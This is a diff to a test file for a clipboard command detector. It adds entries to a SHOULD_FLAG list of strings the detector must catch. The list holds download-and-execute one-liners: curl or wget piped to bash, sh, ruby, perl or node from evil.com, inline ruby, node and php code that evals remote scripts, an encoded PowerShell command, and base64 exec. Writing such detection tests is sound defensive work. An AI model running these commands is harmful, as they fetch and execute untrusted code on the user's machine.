@@ -9,6 +9,7 @@ from sentinelai.monitors.clipboard import _looks_like_command
 
 # Commands that SHOULD be flagged for analysis.
 SHOULD_FLAG = [
+    # Original set
     "curl https://evil.com/setup.sh | bash",
     "wget -O - https://malicious.site/payload.sh | sh",
     "powershell -EncodedCommand JABjAGwAaQBlAG4AdA==",
@@ -23,6 +24,18 @@ SHOULD_FLAG = [
     "/bin/bash -c 'curl http://evil.com | bash'",
     "curl http://192.168.1.1/x.sh|bash",
     "wget http://evil.com/x.sh -O - | sh",
+    # New: language runtime inline execution
+    "ruby -e \"require 'open-uri'; eval(URI.open('http://evil.com/r.rb').read)\"",
+    "perl -e 'use Socket; ...'",
+    "node -e \"require('child_process').exec('curl http://evil.com|bash')\"",
+    "php -r \"eval(file_get_contents('http://evil.com/p.php'));\"",
+    # New: dynamic eval as first token (Python/JS one-liner paste attacks)
+    "exec(__import__('base64').b64decode('aGVsbG8='))",
+    "eval(open('/tmp/payload.py').read())",
+    # New: pipe to ruby/perl/node
+    "curl http://evil.com/r.rb | ruby",
+    "curl http://evil.com/p.pl | perl",
+    "curl http://evil.com/s.js | node",
 ]
 
 # Strings that should NOT trigger monitoring.
